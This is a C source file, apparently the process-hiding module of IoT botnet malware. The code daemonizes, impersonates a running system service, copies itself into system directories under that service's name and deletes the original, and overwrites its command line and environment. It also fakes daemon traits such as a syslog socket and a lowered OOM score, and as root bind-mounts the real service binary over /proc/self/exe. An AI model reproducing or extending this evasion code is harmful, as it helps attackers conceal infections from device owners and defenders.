#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <fcntl.h>
#include <string.h>
#include <sys/prctl.h>
#include <stdint.h>
#include <stdio.h>
#include <ctype.h>
#include <dirent.h>
#include <sys/mount.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <errno.h>
#include <limits.h>

#include "headers/hide.h"
#include "headers/rand.h"

/* ---- IoT-appropriate fallback service names ---- */

static const char *fallback_services[] = {
    "/usr/sbin/dropbear",
    "/usr/sbin/ntpd",
    "/usr/sbin/crond",
    "/usr/sbin/ubusd",
    "/usr/sbin/odhcpd",
    "/usr/sbin/netifd",
    "/sbin/udevd",
    "/usr/sbin/dnsmasq",
    "/usr/sbin/uhttpd",
    "/usr/bin/dbus-daemon",
    "/usr/sbin/sshd",
    "/usr/sbin/rsyslogd",
    "/lib/systemd/systemd-journald",
    "/lib/systemd/systemd-udevd",
    "/usr/sbin/avahi-daemon",
    "/usr/sbin/NetworkManager"
};

#define NUM_FALLBACK (sizeof(fallback_services) / sizeof(fallback_services[0]))

/* ---- Whitelisted directories for relocation ---- */

static const char *reloc_dirs[] = {
    "/usr/sbin",
    "/usr/lib",
    "/usr/libexec",
    "/usr/bin",
    "/sbin",
    "/lib",
    NULL
};

/* ---- State passed across the file ---- */

static char  *saved_argv0     = NULL;
static char  *saved_env_start = NULL;
static char  *saved_env_end   = NULL;
static size_t total_cmdline_space = 0;

/* ---- Helpers ---- */

static const char *basename_of(const char *path) {
    const char *s = strrchr(path, '/');
    return s ? s + 1 : path;
}

static int is_whitelisted_path(const char *path) {
    if (!path) return 0;
    if (strncmp(path, "/usr/",  5) == 0) return 1;
    if (strncmp(path, "/bin/",  5) == 0) return 1;
    if (strncmp(path, "/sbin/", 6) == 0) return 1;
    if (strncmp(path, "/lib/",  5) == 0) return 1;
    if (strncmp(path, "/lib64/",7) == 0) return 1;
    if (strncmp(path, "/opt/",  5) == 0) return 1;
    return 0;
}

static int read_own_exe(char *buf, size_t len) {
    ssize_t r = readlink("/proc/self/exe", buf, len - 1);
    if (r <= 0) return -1;
    buf[r] = '\0';
    return 0;
}

static int copy_file(const char *src, const char *dst) {
    int fds = open(src, O_RDONLY);
    if (fds < 0) return -1;

    int fdd = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (fdd < 0) { close(fds); return -1; }

    char buf[4096];
    ssize_t n;
    while ((n = read(fds, buf, sizeof(buf))) > 0) {
        ssize_t written = 0;
        while (written < n) {
            ssize_t w = write(fdd, buf + written, n - written);
            if (w <= 0) { close(fds); close(fdd); unlink(dst); return -1; }
            written += w;
        }
    }
    int err = (n < 0);
    close(fds);
    close(fdd);
    if (err) { unlink(dst); return -1; }
    chmod(dst, 0755);
    return 0;
}

/* ---- 1. Dynamic service discovery ---- */

#define MAX_CANDIDATES 32

static int discover_services(char candidates[][256], int max) {
    int count = 0;
    pid_t my_pid = getpid();

    DIR *d = opendir("/proc");
    if (!d) return 0;

    struct dirent *e;
    while ((e = readdir(d)) && count < max) {
        if (!isdigit((unsigned char)e->d_name[0])) continue;

        pid_t pid = atoi(e->d_name);
        if (pid <= 1 || pid == my_pid) continue;

        char link[64], exe[256];
        snprintf(link, sizeof(link), "/proc/%d/exe", pid);
        ssize_t r = readlink(link, exe, sizeof(exe) - 1);
        if (r <= 0) continue;
        exe[r] = '\0';

        /* Skip deleted binaries */
        if (strstr(exe, "(deleted)")) continue;

        /* Only keep whitelisted paths */
        if (!is_whitelisted_path(exe)) continue;

        /* Skip critical system processes we shouldn't impersonate */
        const char *bn = basename_of(exe);
        if (strcmp(bn, "init") == 0 || strcmp(bn, "sh") == 0 ||
            strcmp(bn, "bash") == 0 || strcmp(bn, "login") == 0 ||
            strcmp(bn, "getty") == 0 || strcmp(bn, "systemd") == 0)
            continue;

        /* Deduplicate */
        int dup = 0;
        for (int i = 0; i < count; i++) {
            if (strcmp(candidates[i], exe) == 0) { dup = 1; break; }
        }
        if (!dup) {
            strncpy(candidates[count], exe, 255);
            candidates[count][255] = '\0';
            count++;
        }
    }
    closedir(d);
    return count;
}

static const char *pick_service_name(void) {
    static char chosen[256];
    char candidates[MAX_CANDIDATES][256];

    int count = discover_services(candidates, MAX_CANDIDATES);
    if (count > 0) {
        strncpy(chosen, candidates[rand_next() % count], sizeof(chosen) - 1);
        chosen[sizeof(chosen) - 1] = '\0';
        return chosen;
    }

    /* Fallback to static list */
    return fallback_services[rand_next() % NUM_FALLBACK];
}

/* ---- 2. Save environ pointers (before any modification) ---- */

static void save_environ_region(int argc, char **argv) {
    extern char **environ;

    saved_argv0 = argv[0];

    /* argv and environ are contiguous on the stack in Linux.
     * The total overwrite region: argv[0] .. end of last environ string. */
    if (environ && environ[0]) {
        saved_env_start = environ[0];
        int i = 0;
        while (environ[i]) i++;
        if (i > 0) {
            saved_env_end = environ[i - 1] + strlen(environ[i - 1]) + 1;
        } else {
            saved_env_end = saved_env_start;
        }
    } else {
        /* No environ -- use argv bounds */
        saved_env_start = argv[argc - 1] + strlen(argv[argc - 1]) + 1;
        saved_env_end = saved_env_start;
    }

    total_cmdline_space = (size_t)(saved_env_end - saved_argv0);
    if (total_cmdline_space > 4096) total_cmdline_space = 4096; /* sanity cap */
}

/* ---- 3. Daemonize ---- */

static void create_daemon(void) {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    if (setsid() < 0) exit(EXIT_FAILURE);

    signal(SIGHUP, SIG_IGN);

    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    if (chdir("/") != 0) exit(EXIT_FAILURE);
    umask(0);

    long max_fd = sysconf(_SC_OPEN_MAX);
    if (max_fd < 0 || max_fd > 4096) max_fd = 4096;
    for (int i = 0; i < max_fd; i++)
        close(i);

    int fd = open("/dev/null", O_RDWR);
    if (fd != -1) {
        dup2(fd, STDIN_FILENO);
        dup2(fd, STDOUT_FILENO);
        dup2(fd, STDERR_FILENO);
        if (fd > STDERR_FILENO) close(fd);
    }
}

/* ---- 4. Binary relocation ---- */

static int relocate_binary(const char *chosen_name, int argc, char **argv) {
    char own_path[PATH_MAX];
    if (read_own_exe(own_path, sizeof(own_path)) < 0)
        return -1;

    /* Already in a whitelisted path -- no need to relocate */
    if (is_whitelisted_path(own_path))
        return 0;

    const char *bn = basename_of(chosen_name);

    for (int i = 0; reloc_dirs[i]; i++) {
        if (access(reloc_dirs[i], W_OK) != 0)
            continue;

        char new_path[PATH_MAX];
        snprintf(new_path, sizeof(new_path), "%s/%s", reloc_dirs[i], bn);

        /* Don't overwrite real system files */
        struct stat st;
        if (stat(new_path, &st) == 0 && st.st_size > 0)
            continue;

        if (copy_file("/proc/self/exe", new_path) != 0)
            continue;

        /* Verify the copy */
        struct stat src_st, dst_st;
        if (stat(own_path, &src_st) != 0 || stat(new_path, &dst_st) != 0 ||
            src_st.st_size != dst_st.st_size) {
            unlink(new_path);
            continue;
        }

        /* Delete original binary */
        unlink(own_path);

        /* Build new argv for execve */
        char *new_argv[2] = { new_path, NULL };
        (void)argc;
        (void)argv;

        execve(new_path, new_argv, NULL);

        /* execve failed -- clean up and try next dir */
        unlink(new_path);
        /* Note: original is already unlinked but still mapped in memory, process continues */
    }

    return -1; /* relocation failed, degrade gracefully */
}

/* ---- 5. Environment sanitization ---- */

static void sanitize_environ(void) {
    extern char **environ;

    /* Zero out the original environ memory region (visible via /proc/pid/environ) */
    if (saved_env_start && saved_env_end > saved_env_start) {
        memset(saved_env_start, 0, (size_t)(saved_env_end - saved_env_start));
    }

    /* clearenv + set minimal clean environment */
    clearenv();
    setenv("PATH", "/usr/sbin:/usr/bin:/sbin:/bin", 1);
    setenv("HOME", "/", 1);
    setenv("LANG", "C", 1);
    setenv("TERM", "linux", 1);
}

/* ---- 6. Expanded cmdline overwrite ---- */

static void overwrite_cmdline(int argc, char **argv, const char *new_name) {
    if (!saved_argv0 || total_cmdline_space == 0) {
        /* Fallback: basic argv[0] overwrite */
        size_t name_len = strlen(new_name);
        size_t avail = strlen(argv[0]);
        if (name_len <= avail) {
            memcpy(argv[0], new_name, name_len);
            memset(argv[0] + name_len, 0, avail - name_len);
        } else {
            memcpy(argv[0], new_name, avail - 1);
            argv[0][avail - 1] = '\0';
        }
        for (int i = 1; i < argc; i++)
            memset(argv[i], 0, strlen(argv[i]));
        return;
    }

    /* Use the full argv+environ region */
    size_t name_len = strlen(new_name);
    if (name_len >= total_cmdline_space)
        name_len = total_cmdline_space - 1;

    memcpy(saved_argv0, new_name, name_len);
    memset(saved_argv0 + name_len, 0, total_cmdline_space - name_len);

    /* Point argv[1..n] to empty strings within the zeroed region */
    for (int i = 1; i < argc; i++)
        argv[i] = saved_argv0 + name_len;
}

/* ---- 7. File descriptor hygiene ---- */

static void fd_hygiene(void) {
    /* Open syslog socket -- makes /proc/pid/fd look like a normal daemon */
    int slog = socket(AF_UNIX, SOCK_DGRAM, 0);
    if (slog >= 0) {
        struct sockaddr_un sa;
        memset(&sa, 0, sizeof(sa));
        sa.sun_family = AF_UNIX;
        strncpy(sa.sun_path, "/dev/log", sizeof(sa.sun_path) - 1);
        connect(slog, (struct sockaddr *)&sa, sizeof(sa));
        /* Leave open intentionally -- daemon decoration */
    }

    /* Set OOM score to look like a system daemon */
    int fd = open("/proc/self/oom_score_adj", O_WRONLY);
    if (fd >= 0) {
        write(fd, "-500\n", 5);
        close(fd);
    }
}

/* ---- 8. /proc/self/exe bind mount (root only, defense in depth) ---- */

static void bind_mount_exe(const char *chosen_name) {
    if (getuid() != 0) return;

    /* Only attempt if chosen service binary actually exists on disk */
    struct stat st;
    if (stat(chosen_name, &st) != 0) return;

    /* Bind mount the real service binary over our /proc/self/exe */
    mount(chosen_name, "/proc/self/exe", NULL, MS_BIND, NULL);
    /* Silently ignore failure -- this is a best-effort enhancement */
}

/* ---- Main entry point ---- */

int hide(int argc, char **argv) {
    /* Save environ region pointers before anything modifies them */
    save_environ_region(argc, argv);

    /* Daemonize */
    create_daemon();

    /* Pick a service to impersonate */
    const char *chosen_name = pick_service_name();

    /* Attempt binary relocation (may execve and not return) */
    relocate_binary(chosen_name, argc, argv);

    /* Set /proc/self/comm to basename (max 16 bytes, correct usage of prctl) */
    const char *bn = basename_of(chosen_name);
    prctl(PR_SET_NAME, (unsigned long)bn);

    /* Overwrite /proc/self/cmdline using expanded argv+environ region */
    overwrite_cmdline(argc, argv, chosen_name);

    /* Clean /proc/self/environ */
    sanitize_environ();

    /* Daemon-like fd setup */
    fd_hygiene();

    /* Defense in depth: bind mount /proc/self/exe (root only) */
    bind_mount_exe(chosen_name);

    return 0;
}
